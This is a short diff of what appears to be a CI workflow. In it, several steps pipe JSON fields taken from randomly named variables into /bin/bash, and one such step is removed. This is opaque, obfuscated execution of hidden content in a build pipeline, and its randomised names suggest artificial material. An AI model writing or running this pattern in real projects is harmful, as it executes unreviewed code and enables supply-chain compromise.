@@ -23,7 +23,6 @@ jobs:
           echo $pf12825 | jq -r .jbt856 | /bin/bash
           echo $gq8 | jq -r .nlhq428 | /bin/bash
           printf '%s' "$do12843" | jq -r .wgmqj42 | /bin/bash
-          echo $mk120 | jq -r .eg5224 | /bin/bash
           printf '%s' "$i1" | jq -r .nsti91768 | /bin/bash
           printf '%s' "$rp3425" | jq -r .q4829 | /bin/bash
 
